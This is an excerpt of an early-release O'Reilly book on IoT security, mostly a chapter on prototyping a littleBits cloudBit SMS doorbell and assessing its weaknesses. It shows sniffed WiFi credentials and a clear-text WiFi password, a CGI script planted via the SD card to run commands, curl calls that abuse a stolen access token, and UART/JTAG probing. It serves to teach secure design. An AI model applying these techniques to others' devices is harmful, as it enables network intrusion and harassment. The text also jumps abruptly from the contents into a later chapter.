
Nitesh Dhanjani
Abusing the Internet of Things

Abusing the Internet of Things
by Nitesh Dhanjani
Copyright © 2010 Nitesh Dhanjani. All rights reserved.
Printed in the United States of America.
Published by O’Reilly Media, Inc., 1005 Gravenstein Highway North, Sebastopol, CA 95472.
O’Reilly books may be purchased for educational, business, or sales promotional use. Online editions are
also available for most titles (http://safaribooksonline.com). For more information, contact our corporate/
institutional sales department: 800-998-9938 or corporate@oreilly.com.
Editors: Mike Loukides and Brian Sawyer
Production Editor: FIX ME!
Copyeditor: FIX ME!
Proofreader: FIX ME!
Indexer: FIX ME!
Cover Designer: Karen Montgomery
Interior Designer: David Futato
Illustrator: Rebecca Demarest
January -4712:
First Edition
Revision History for the First Edition:
2015-04-03: Early release revision 1
2015-05-29: Early release revision 2
2015-06-08: Early release revision 3
2015-06-16: Early release revision 4
2015-06-26: Early release revision 5
See http://oreilly.com/catalog/errata.csp?isbn=0636920033547 for release details.
Nutshell Handbook, the Nutshell Handbook logo, and the O’Reilly logo are registered trademarks of O’Reilly
Media, Inc. !!FILL THIS IN!! and related trade dress are trademarks of O’Reilly Media, Inc.
Many of the designations used by manufacturers and sellers to distinguish their products are claimed as
trademarks. Where those designations appear in this book, and O’Reilly Media, Inc. was aware of a trademark
claim, the designations have been printed in caps or initial caps.
While every precaution has been taken in the preparation of this book, the publisher and authors assume
no responsibility for errors or omissions, or for damages resulting from the use of the information contained
herein.
ISBN: 063-6-920-03354-7
[?]

Table of Contents
Preface. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  vii
aware that their cars are using insecure mechanisms to transmit tire pressure data.
The ability to remotely take over a telematics ECU is quite phenomenal. We’ve seen that
the CANBus architecture explicitly trusts every other ECU so a simple successful cellular
attack can be lethal giving the spectrum of malicious actors control of the car. It is
unnerving to uncover that most of the vulnerabilities found were a result of basic soft‐
ware mistakes such as buffer overflows, the reliance on obscurity, and improper im‐
plementation of cryptography.
The Tesla Model S is indeed a set of computer on wheels, fully electric and always
connected to the Internet. At 691 horsepower, the power of this beast probably makes
it one of the fastest consumer grade Internet of Things available for purchase. Despite
being a pleasure to drive and lauded as one of the most innovative cars ever produced,
owners should be concerned that this luxury vehicle provides remote unlock and start
functionality which is protected by a single-factor password system that the security
community has known to be easily susceptible to social engineering, phishing, and
malware attacks. This can lead to a situation where cars such as the Tesla may be ex‐
ploited by a myriad of malicious actors such as pranksters or state sponsored activists
Conclusion 
| 
213

for various motives. In addition, it is unclear to owners what mechanisms and processes
are being employed by Tesla to prevent social engineering of their own employees and
also to protect the location privacy of car owners.
Cars in the market today are vulnerable to software flaws that can be mitigated by the
inclusion of security design and analysis earlier on and throughout the product devel‐
opment process. We out to pay careful attention and strive to remediate issues that can
put our physical safety and privacy at risk. It’s probably not a bad guess to insist that our
exposure to the attack surface posed by connected cars that take us to the world of
autonomous is bound to multiply should we not take considerable action now.
214 
| 
Chapter 6: Connected Car Security Analysis: From Gas to Fully Electric

CHAPTER 7
Secure Prototyping: littleBits and cloudBits
With the announcement of the iPhone in 2007, Apple single handedly disrupted the
smart phone industry with the first generation version of the product. From an external
viewpoint, the iPhone announced in 2007 may very well have been the first version of
the finished product visible to the public. However, the initial product idea that even‐
tually led to the iPhone was a touch-sensitive tablet that would allow users to do away
with a physical keyboard. Once Steve Jobs saw the prototype of the tablet, he decided
he wanted to implement the technology on a smart phone first.
Prototypes help us think through the relevancy of our ideas by helping us focus our
intellectual capacities on the intention of our conceived product. The great thing about
creating prototypes is that the process can help us quickly realize potential roadblocks
to the design of the final product early on. Prototyping, just like in the case of Apple
and Jobs, can also help us test different versions of our idea that may turn into a whole
other form factor than what we originally planned.
There are numerous platforms and kits available that allow individuals to prototype
ideas for IoT products at low cost and effort. In this chapter, we are going to focus on
the littleBits platform since it is one of the simplest and most elegant prototyping sol‐
utions on the market. The littleBits module includes magnets that can be snapped to‐
gether like Legos, which allows us to construct a prototype in mere seconds. We will use
the cloudBit module to facilitate a simple doorbell that can send alerts via SMS message.
Once we have completed designing our prototype, we will take a look at security issues
that are relevant to the littleBits platform so that we are aware of security controls we
will have to put in place during subsequent iterations of our product prior to production.
The goal of this exercise is to siumlate real world processes companies go through from
initial prototype to production so we can think through how to embed security controls
at the right times.
215

The effort required to secure an IoT device includes context such as how the product
may be used as well as what type of threat agents are likely to abuse it for malicious
purposes. For example, a sophisticated gang of terrorists may want to gain and maintain
access to IoT devices that serve critical infrastructure such as connected cars and lighting
systems. On the other hand, threat agents such as cyber bullies are likely to abuse device
functionalities to harass others. In this chapter we will step through designing a proto‐
type and begin to formulate our thinking around security controls that leverage use
cases and the intentions of potential threat agents.
Introducing the cloudBit Starter Kit
The cloudBit starter kit is a great way to start tinkering with IoT product ideas that
require remote connectivity, i.e. communication via the Internet. It is a simple and
elegant kit that can be used to brainstorm the feasibility of ideas and test out use cases
prior to expending too much effort on a full-blown solution. The kit consists of 5 pro‐
totyping modules and the USB power module (Figure 7-1).
Figure 7-1. The USB power module
The USB power module powers the cloudBit projects. It can be powered using a USB
cable or a wall adapter (Figure 7-2), both of which are included in the kit.
216 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Figure 7-2. The USB power adapter and cable
The long LED (Light Emitting Diode) module can be used to provide lighting. It is called
“long” because the light is tethered by a cable, which allows you to place the light in
different places within the body of the prototype hardware or another object. The kit
also includes the servo, a controllable motor that swings back and forth or continuously
in a specific direction (clockwise or anti-clockwise). The sound trigger module listens
to noise levels in the environment and can be programmed to activate other modules
when the noise rises above a defined threshold. The button module (Figure 7-3), as the
name suggests, is a simple button that when pressed activates other modules.
Introducing the cloudBit Starter Kit 
| 
217

Figure 7-3. The button module
The cloudBit module (Figure 7-4) is clearly the star of the show. It is basically a small
computer that is powered by the Linux operating system. It includes WiFi functionality
that can be easily configured to connect to the free littleBits cloud infrastructure that
we will learn about in the following sections.
218 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Figure 7-4. The cloudBit module
Once connected, the cloudBit module sends data to the littleBits cloud, which can be
used by remote applications to control modules connected to the cloudBit.
Setting Up the cloudBit
The first order of business is to set up the cloudBit to connect to WiFi so that it can
contact and connect with the littleBits cloud infrastructure. To do this, we need to first
sign up for a littleBits account (https://littlebits.cc/signup) as shown in Figure 7-5.
Introducing the cloudBit Starter Kit 
| 
219

Figure 7-5. Signing up for a littleBits account
After signing up for an account, we can name our cloudBit module by going to http://
control.littlebitscloud.cc (Figure 7-6).
220 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Figure 7-6. Naming our cloudBit module
Once we have named our module, we are asked to power on the cloudBit (Figure 7-7).
To do that, attach the wall adapter to the USB Power module, and then attach the USB
Power module to the cloudBit.
Note that littleBits modules have magnets on their sides making it easy for them to snap
together with other modules. They are also color coded. Blue colored modules are power
modules, such as the USB power module, that help power the circuit. Red indicates
Introducing the cloudBit Starter Kit 
| 
221

input; these modules accept input from the user or the environment (example: Button).
These modules in turn send signals to following modules that are colored green to
indicate output. These modules perform an action, such as the servo, which is a motor
that can rotate in a particular direction. Orange colored modules are called “wires”; they
are used to expand the reach of the project, such as the cloudBit module, which is used
to provide remote connectivity to the prototype. The order in which the modules are
snapped next to each other is important: power modules always come first and input
modules only effect output modules that come after them.
Once the cloudBit is powered on, the light underneath the word “Status” on the module
will start flashing. Press the button titled “Status light is flashing” Figure 7-7.
222 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Figure 7-7. Booting up the cloudBit
We now see the screen shown in Figure 7-8.
Introducing the cloudBit Starter Kit 
| 
223

Figure 7-8. Configuring cloudBit
Per the instructions, hold down the setup button until the light blinks blue, and then
let go until it stabilizes to a steady blue color. Once that happens, click the “Blue light is
steady” button shown in Figure 7-8. At this point, the cloudBit will start up it’s own WiFi
network in the form of “littleBits_Cloud_…” that we can connect to (see Figure 7-9).
224 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Figure 7-9. Connecting to the cloudBit WiFi network
Once we have connected to the WiFi network exposed by the cloudBit, our browser will
locate the module and query it for other WiFi networks it can detect (Figure 7-10).
Introducing the cloudBit Starter Kit 
| 
225

Figure 7-10. WiFi networks detected by cloudBit
At this point, we will select our home WiFi network, which is TouchOfClass in this
example (see Figure 7-11).
226 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Figure 7-11. Selecting WiFi network and entering credentials
After clicking on “Save”, we are asked to connect back to our home WiFi network (Tou‐
chOfClass). The cloudBits module is now configured and connected to the littleBits
cloud infrastructure.
Designing the SMS Doorbell
Now that we have our cloudBit module configured, we can use it to prototype a doorbell
that sends us an SMS message when the doorbell is pressed. We will use the IFTTT (If
This Then That) platform first mentioned in Chapter 1 to handle the interaction be‐
tween the cloudBit and the phone that will receive the SMS message. Go to https://
ifttt.com/join to create an IFTTT account if you don’t already have one. After that, go
to https://ifttt.com/littlebits to activate the littleBits channel. Activiating the channel will
authorize IFTTT to interact with the cloudBit using the littleBits network (Figure 7-12).
Introducing the cloudBit Starter Kit 
| 
227

Figure 7-12. Turning on the littleBits Channel on IFTTT
Now we are ready to create an IFTTT recipe that will send an SMS to our phone when
our doorbell is pressed. Go to https://ifttt.com/myrecipes/personal/new to create a new
recipe. Click on “this” and type in “little” to search from the list of triggers. (Triggers are
basically events that trigger a reaction, i.e. they are the “this” part of an IFTTT recipe,
while an action channel [example: SMS] is the “that” part of the recipe.) Select littleBits
228 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

from the list, and then click on “Input received,” which will make the recipe run when
another input module (such as a button module) sends a signal to the cloudBit. Select
our cloudBit named SMS_Door_Bell (Figure 7-6) from the list of authorized cloudBits,
and then click on Create Trigger (Figure 7-13).
Figure 7-13. Selecting our cloudBit for the recipe
Next, click on “that” (Figure 7-14).
Figure 7-14. Click on “that” to select our cloudBit as the recipe trigger
Introducing the cloudBit Starter Kit 
| 
229

Now, type SMS (Figure 7-15) and choose it as an action channel.
Figure 7-15. Selecting the SMS action channel
Click on Activate to activate the SMS channel. You will be asked to enter a valid cellular
phone number capable of receiving SMS messages (Figure 7-16). Click on Send PIN to
have the number sent to your phone. Once you receive the PIN, enter it into the website,
click on Activate, and then click on Done below the “SMS Activated!” message. Then
click on “Continue to the next step”.
230 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Figure 7-16. Activating the SMS action channel
Now click on “Send me an SMS” under the “Choose your Action” section. You can now
edit the message you will recieve when someone rings our doorbell. In Figure 7-17, we
Introducing the cloudBit Starter Kit 
| 
231

see an example of a custom SMS message that will result in the text “Hey, someone
pressed me! -Sincerely, SMS_Door_Bell”.
Figure 7-17. Customizing the trigger SMS message
Click on Create Action, pick a title for the recipe, and then click on Create Recipe. That’s
it—our recipe is active!
Oops, We Forgot the Button!
Wait a second. We forgot to add the button module to represent the doorbell. Oops!
Our project is not much of a doorbell if there isn’t an actual button to represent a door‐
bell. But fear not: instances like these are the reason that littleBits is such an elegant
prototyping platform. We are going to add in a button without losing any of the work
we have already done.
If you look closely at the button module (Figure 7-3), you will see that it has a right
arrow on its top. This means that the module on to its right will receive a trigger when
the button is pressed. Therefore, the button module needs to be on the left side of our
cloudBit.
232 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Pull the cloudBit away from the USB power module; this will power it off. Connect the
button module to the power module, and then connect the cloudBit on the right side
of the button module. The project should now look like Figure 7-18.
Figure 7-18. Doorbell prorotype using the cloudBit
Press the button and you should get a SMS on your cell phone as shown in Figure 7-19.
Introducing the cloudBit Starter Kit 
| 
233

Figure 7-19. SMS message alert from IFTTT
234 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Even though we forgot to add in the button module initially, our oversight was easy to
fix by simply plugging in the module afterwards. We didn’t have to take any additional
steps with re-configuring cloudBit or re-programming our recipe. This makes littleBits
a powerful prototyping platform.
Security Evaluation
We now have a working prototype of a wireless doorbell that sends an SMS message
when pressed. Now is a good time for us to pause and think about security. An IoT
product that is susceptible to vulnerabilities can put potential customers at risk and also
taint the perception of the company. To approach our analysis, we will first go through
things we have learnt from security issues in other IoT products and see if our prototype
is vulnerable to similar issues. We will then discuss additional security mechanisms that
can be implemented to further secure the prototype and leverage existing IoT security
frameworks to make sure our approach is comprehensive.
WiFi Insecurity, Albeit Brief
One of the first things we did to create a working prototype was to configure the cloudBit
to hop onto our home WiFi by supplying credentials to the network (Figure 7-11). The
finished product will also require the customer to input their WiFi credentials in a
similar fashion. It is important for us to understand the potential abuse cases for this
design.
We had to join the temporary WiFi network exposed by our cloudBit to configure it.
Once on the cloudBit network, our browser connected to the cloudBit web server (with
IP address of 10.0.0.1) and requested the resource http://10.0.0.1/scan-wifi, the output
of which is shown in Figure 7-20.
Security Evaluation 
| 
235

Figure 7-20. cloudBit query to obtain list of WiFi networks in range
Once the browser obtains the list of networks from the cloudBit, it renders it to the user
(Figure 7-10). When the user selects their home network and enters their credentials
(Figure 7-11), the web browser sends the following HTTP request to the cloudBit on
the local network:
POST /set-wifi/ HTTP/1.1
Host: 10.0.0.1
Accept: */*
Proxy-Connection: keep-alive
Accept-Language: en-us
236 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://control.littlebitscloud.cc
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2)
AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18
Connection: keep-alive
Content-Length: 92
Referer: http://control.littlebitscloud.cc/
DNT: 1
ssid=TOUCHOFCLASS&mac=771FA1263FEC&security=wpa2&encryption=on
&password=topsecretpassword
Here is the response from cloudBit:
HTTP/1.1 200 OK
Access-Control-Allow-Headers: Authorization, Content-Type, If-None-Match
Access-Control-Allow-Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Origin: *
Access-Control-Expose-Headers: WWW-Authenticate, Server-Authorization
Access-Control-Max-Age: 86400
Content-Type: application/json; charset=utf-8
Date: Sun, 08 Mar 2015 05:34:07 GMT
Server: lighttpd/1.4.35
Content-Length: 20
{ "success": true }
After sending the response, the cloudBit will hop on the TouchOfClass WiFi network
using the credentials “topsecretpassword”. This lets the cloudBit reach the littleBits cloud
infrastructure, allowing us to control the module from the http://control.littlebit
scloud.cc website.
The security issue to keep in mind here is that the temporary WiFi network exposed by
cloudBits is not secured or encrypted. This means that anyone within range of the
temporary network can also join the network. Furthermore, the POST /set-wifi/ to
the cloudBit is not encrypted using TLS or any other mechanism, allowing a rogue party
that has joined the network to easily capture the user’s home network WiFi credentials.
The risk of this issue is relatively low since the attacker has to be within the vicinity of
the network and has to act within the window of time when the user configures his or
her cloudBit. However, as we have discussed in previous chapters, any computing device
that has been remotely compromised and is within vicinity can continuously scan for
temporary cloudBit WiFi networks and hop onto them to capture credentials, i.e. an
attacker with access to a computing device infected with malware can automate this
process by building the attack vector into the malware code. As IoT devices multiply in
our society, malware authors are going to design their malware to take advantage of
time windows such as these. Malware may infect a particular device and rely on an
already established WiFi connection, the password to which may be stored in encrypted
Security Evaluation 
| 
237

form. Therefore, obtaining the clear-text password to the WiFi network can provide
added advantage to remote attackers.
One solution here is to embed a unique private key in each instance of the product,
which may be expensive. Another option is to have a serial number printed on the device
that is used as a private key to encrypt the actual WiFi password. The user will have to
supply the WiFi password as well as the device’s serial number, which will be encrypted
by the web browser (using JavaScript) and sent to the cloudBit, which can then decrypt
it using its own serial number as the key. There are various ways encryption can lower
the risk of this issue. The important thing is for product manufacturers to acknowledge
the potential risk, the potential consequences, and make an informed business decision
on implementing security mechanisms to lower the risk to customers.
Sneaking in Command Execution
In Chapter 5, we discussed various scenarios where access to the file system can help
tinkerers and potential malicious entities discover how to bypass security controls and
uncover potential vulnerabilities. The cloudBit runs the Linux operating system and
includes a Secure Digital (SD) card that contains the file system. In this section, we will
attempt to mount this card and take a look at what’s inside.
Power off the project by separating the cloudBit from the button module. Carefully
remove the micro SD card implanted in the cloudBit, and then insert the card into a
laptop equipped with a micro SD card reader. The card should mount automatically in
most modern distributions. In OS X, you will need to install OSXFuse and fuse-ext2,
after which the disk should automatically mount in /Volumes/littleRoot/.
It’s a good idea to create a list of files that you can scroll through. Run the following
command in OS X:
$ *ls -lR /Volumes/littleRoot/* ~/Desktop/littleRoot.txt*
Then go through the ~/Desktop/littleRoot.txt to look for interesting files, such as
etc/wpa_supplicant/cloudbit.conf:
network={
        ssid="TOUCHOFCLASS"
        #psk="youcann0tguessme!"
        psk=3f6380509ca89b4c5506fd39e7a3a8b2d5cda338b51accbad1f1850fefbabd47
        key_mgmt=WPA-PSK
}
Here we have a situation where the WiFi password is stored in clear text. What’s more,
the PSK hash (calculated using the ssid and password) is also present. This creates a
situation where anyone with access to the doorbell can easily access the file system and
gain access to the customer’s home WiFi network. Stronger controls that store the key
in a secure hardware processor (such as the Apple A7 processor) would be a better
238 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

solution. Even though the product at hand is a mere doorbell, the security of the user’s
entire internal network could be put at risk by storing credentials such as the WiFi
password in the clear. Since the cloudBits platform is merely for prototyping, uncovering
issues like this is a good way to start to figure out security requirements early on.
The /srv/http directory contains files for the web server that is activated when the
cloudBit is in setup mode. We can put executable scripts in this directory to have com‐
mands run for us on the live instance of the cloudBit. Let’s give it a shot:
[bash]$ cd /Volumes/littleRoot/srv/http/set-wifi
Now put the following file (ps_netstat.cgi) into this directory:
#!/bin/bash
echo "Content-type: text/html"
echo ""
echo ""
echo '<html>'
echo '<body>'
echo '<pre>'
ps -aux
echo "<br><br><br>"
netstat -na
echo '</pre>'
echo '</body>'
echo '</html>'
Set the right permissions:
[bash] chown 33:_appstore ps_netstat.cgi
[bash] chmod 755 ps_netstat.cgi
Now unmount the micro SD card and insert it back into the cloudBit. Once the cloudBit
powers on, hold the “setup” button for a few seconds until the LED light blinks blue,
and then let go; the light will stop blinking. Join the temporary “littleBits_Cloud_…"”
WiFi network and browse to http://10.0.0.1/set-wifi/ps_netstat.cgi. You will see the
output from the ps and netstat command, as shown in Figure 7-21!
Security Evaluation 
| 
239

Figure 7-21. Successful execution of the ps and netstat commands
This is a crafty way to execute live commands on the cloudBit to analyze more details
in the device that are occurring in run-time. The designers of cloudBit do not want
people to directly execute local commands on it since it may destroy the integrity of the
product and as such it does not come with any way to remotely log in to the Linux system
running on it. In this case, we have found a way to bypass their intention and execute
local commands. This is yet another example of security issues we need to think about
during the prototyping state: is it important that external parties be unable to tinker
with the live system? In this case, the issue is that the file system is accessible by mounting
the memory card, which in turn allows anyone with access to the product to analyze
the system in real time. The case here is not to impose obscurity as the intention of
disallowing such tampering, but further protecting the product from a remote vulner‐
ability in the web server or other services that can lead to compromise of not just the
doorbell, but other important IoT devices (such as lighting and door locks) that may
share the local network.
240 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

One Token to Rule them All
Once the cloudBit is configured, you can browse to http://control.littlebitscloud.cc and
click on Settings to get the value of the DeviceID and AccessToken that is assigned to
your cloudBit (Figure 7-22).
Figure 7-22. AccessToken assigned to the cloudBit
The AccessToken can be used to interact with the cloudBit remotely. For example, the
link in the form of https://api-http.littlebitscloud.cc/devices/DeviceID/
input?access_token=AccessToken&token_type=bearer displays the status of the
cloudBit. This resource uses the cloudBit API to query the status of the cloudBit every
second. The first sequence of output shown in Figure 7-23 lists the value of percent as
100 because the button attached to the cloudBit was pressed, causing positive input to
be sent to the cloudBit. The second sequence lists the value as 0, indicating that the
button is not being pressed anymore.
Security Evaluation 
| 
241

Figure 7-23. Information about the connected cloudBit using the cloudBit API
We needed both the DeviceID and AccessToken to query information about the cloud‐
Bit from the API. However, if we only knew the AccessToken, we could obtain the
DeviceID by querying the devices associated with the user in this way:
$ curl -i -XGET -H "Authorization: Bearer [AccessToken DELETED]" -H
"Accept: application/vnd.littlebits.v2+json"
https://api-http.littlebitscloud.cc/devices
HTTP/1.1 200 OK
accept-ranges: bytes
access-control-allow-headers: Authorization, Content-Type, If-None-Match
access-control-allow-methods: GET, HEAD, POST, PUT, PATCH, DELETE, OPTIONS
access-control-allow-origin: *
access-control-expose-headers: WWW-Authenticate, Server-Authorization
access-control-max-age: 86400
cache-control: no-cache
content-type: application/json; charset=utf-8
Date: Thu, 02 Apr 2015 04:51:49 GMT
Content-Length: 272
Connection: keep-alive
[{"label":"SMS_Door_Bell","id":"[DELETED]","user_id":[DELETED],"is_connected":
true,"ap":{"ssid":"TOUCHOFCLASS","mac":"[DELETED]","strength":"99","server_id"
:"DfhIt25l","socket_id":"F1PDVb2Il","status":"2"},"subscriptions":[],
"subscribers":[],"input_interval_ms":750}]
The value of id returned from the curl command is the DeviceID that is associated
with the user’s account. This proves that the secrecy of the value of the AccessToken
ultimately guards access to the cloudBit. The cloudBit API advertises no way for de‐
velopers to request a new AccessToken. Without this functionality, the provided Ac
cessToken will persist forever. Given that littleBits and cloudBits platforms are not
intended for production use, there is low risk to the prototype itself. However, designers
242 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

should bake in methods for the final product to be able to expire and refresh the Ac
cessToken. This will prevent the token from persisting forever, which increases the
chance that it can be compromised.
Let’s add a buzzer module to our prototype. As shown in Figure 7-24, we attach the
buzzer module by snapping it into the right side of the cloudBit. Now our prototype
will be able to send an SMS when the button is pressed as well as activate a local audio
buzzer just like a traditional doorbell. This illustrates how powerful the littleBits pro‐
totyping platform is: designers can add and change functionality based on new ideas in
a matter of seconds.
Figure 7-24. Buzzer module added to the SMS Doorbell prototype
In order for our prototype to send an SMS and activate the buzzer, you will have to
create an extra IFTTT recipe that will need to select the cloudBit for both the input and
output sections (Figure 7-25).
Security Evaluation 
| 
243

Figure 7-25. Additional IFTTT recipe to sound buzzer
The final product may include a smartphone app that will have to store the token to the
local filesystem. If the app or the phone is compromised in any way, attackers can gain
access to the token. Another scenario could be the compromise of all issues AccessTo
ken values that are stored on the littleBits servers. This could allow an attacker to control
all cloudBit modules that are online. Once the initial prototype is complete, thinking
through such scenarios will help designers understand the importance of implementing
mechanisms for tokens to expire and be refreshed. In the case where a malicious entity
gains access to the token, a simple command such as the following will cause the pro‐
totype’s buzzer to sound infinitely in a screeching tone:
$ curl -i -XPOST -H "Authorization: Bearer [AccessToken DELETED]:
application/vnd.littlebits.v2+json"
https://api-http.littlebitscloud.cc/devices/[DeviceID DELETED]/output
-d percent=100 -d duration_ms=-1
HTTP/1.1 200 OK
access-control-allow-headers: Authorization, Content-Type, If-None-Match
access-control-allow-methods: GET, HEAD, POST, PUT, PATCH, DELETE, OPTIONS
access-control-allow-origin: *
access-control-expose-headers: WWW-Authenticate, Server-Authorization
244 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

access-control-max-age: 86400
cache-control: no-cache
content-type: application/json; charset=utf-8
Date: Thu, 02 Apr 2015 05:49:08 GMT
Content-Length: 16
Connection: keep-alive
Imagine waking up in the middle of the night with your doorbell screeching at you
nonstop. Some may have the courage to immediately check who is at the front door only
to be further confused after realizing there is no one there but the doorbell is still ringing.
These are the types of use cases—and abuse cases—designers need to begin to under‐
stand earlier on in their prototyping modules so that every subsequent iteration of their
product lowers the probability of their products being abused to harm or inconvenience
their customers.
Beware of Hardware Debug Interfaces
IoT devices often include hardware ports that are useful for debugging; they require
physical access to the device. Tinkerers and security researchers have found that it is
often possible to change the functionality of devices by using physical debug interfaces
to modify the firmware. It is also often possible to uncover stored secrets such as en‐
cryption keys that may be stored on the device. If the same encryption key is used on
all other device of the same type, attackers can use this information to compromise the
integrity of other devices by having one-time access to a candidate device and extracting
the information.
UARTs (Universal Asynchronous Receiver Transmitter) chips are commonly found on
microcontrollers and often leveraged to implement debug functionality. They use serial
(one bit at a time at a specified rate) communication to transmit information between
an attached client device and the microcontroller. The first order of business is to locate
the VCC (power), GND (ground), RX (receive), and TX (transmit) pins as shown in
Figure 7-26.
Security Evaluation 
| 
245

Figure 7-26. UART communication pins
Along with visual inspection, a multimeter is used to measure voltages to identify UART
pins. The multimeter should be set to continuity mode, which is a feature present in
most multimeters. This mode lets us test the resistance between two points on the board.
If there is low resistance, it means that the two points are connected electrically and the
multimeter will emit a tone. If the two points have high resistance between them, it
means that the circuit is open and the multimeter will not emit a tone.
To identify the ground pin, find an area on the board that has metal shielding (this
appears as a metal cover over parts of the board) and place the black colored multimeter
probe on it. Next, place the red probe on a pin that you suspect is the ground pin. If the
multimeter emits a tone it means that the pin is connected to ground and so it is the
ground pin. UART exposes four or more pins, so look for areas on the board that have
four or more pins next to each other.
If the red probe is placed on the power pin, the multimeter will emit a short beep rather
than a continuous tone. It is useful to identify the power pin even so we know it is not
a transmit or receive pin.
A transmit pin will cause the multimeter to show a voltage value of around 3.3, which
is common for UART. As the transmit pin transmits data (often when the device has
been powered on and it is booting firmware), the voltage drops to 0 and then back to
3.3. The multimeter will average the sampled voltage, which will dip down when data
is being transmitted, especially when the device has just been powered on.
Identifying the receive pin is more difficult, and the best course of action is to identify
it by eliminating the ground, power, and transmit pins.
In order to communicate with the UART, a simple UART-to-USB adapter can be used.
The ground pin on the board should be connected to the ground of the adapter, while
the transmit and receive pins should be switched.
246 
| 
Chapter 7: Secure Prototyping: littleBits and cloudBits

A simple communications program such as Minicom can be used to connect and in‐
teract with the UART. However, we will have to tell Minicom exactly what baud rate to
use. (Baud is the unit for how many bits are transferred in a second.) The baudrate tool
can be used to automatically detect the baud rate and connect to the device.
The Reverse Engineering Serial Ports tutorial walks through how to locate UART pins
and connect to the UART of a hardware device in order to gain access to the system
shell on the device.
The Exploitee.rs website is a great resource that provides photos of identified UART
pins and baud rates for many popular devices. This information can be used to obtain
UART access to configure the devices, obtain firmware, and update firmware on devices
in order to insert additional features or bypass security controls and limitations designed
by the manufacturer.
The cloudBit module website states: “We’ve left pads on the bottom of
the board so that you can connect to the cloudBit’s serial console us‐
ing 3.3V UART (8-N-1, 115,200 baud) and poke around”. Readers that
have the UART hardware and software tools outlined in this chap‐
ter can use the baud settings listed (8-N-1, 115,200 baud) to tinker
with their cloudBit’s UART interface.
Another popular hardware debug interface is called JTAG, which stands for Joint Test
Action Group. There are various JTAG pin combinations. Most JTAG interfaces have
five basic pins: TDI (Test Data In), TDO (Test Data Out), TCK (Test Clock), TMS (Test
Mode Select), and TRST (Test Reset). Identifying these pins can become tedious, but
the popular JTAGultor hardware tool can automatically identify the pins. Joe Grand,
the creator of the tool explains how to use JTAGulator in this YouTube video.
The LIFX lightbulbs were found to use the JTAG interface by security researchers who
used the interface to uncover a security vulnerability. The LIFX architecture does not
require a hub like the Philips hue system. Instead, one lightbulb is connected to the WiFi
network and is deemed the master bulb. Other bulbs connect to the master bulb using
the 6LoWPAN standard (it stands for “IPv6 over Low Power Wireless Personal Area
Networks”). This allows the bulbs to use low power, especially when not illuminated,
and to extend their network via a mesh network to reach bulbs past the range of WiFi.
The researchers used the JTAG interface to obtain the firmware stored on the lightbulbs.
This firmware contained a global encryption key that was the same in all LIFX lightbulbs.
This symmetric encryption key is utilized to encrypt and decrypt communication be‐
tween all LIFX lightbulbs. Armed with this information, the researchers demonstrated
that they could inject arbitrary instructions into any LIFX mesh network allowing them
to command the lights. In this case, the attacker abusing this issue would have to be
within 30 meters of the LIFX bulbs, since the attack is conducted on the local network.
Security Evaluation 
| 
247

Interfaces such as UART and JTAG can be used to uncover security issues such as global
shared encryption keys, which are a bad idea since attackers can exploit the architecture
once the key is compromised. In the case of our cloudBits prototype, we came across
an issue where the local WiFi network was stored in clear text on disk. Stored secrets in
hardware platforms are a common issue and attackers are bound to attempt to uncover
them. In order to help promote better hardware security, the Trusted Computing Group
(TCG) has published and continues to update the Trusted Platform Module (TPM)
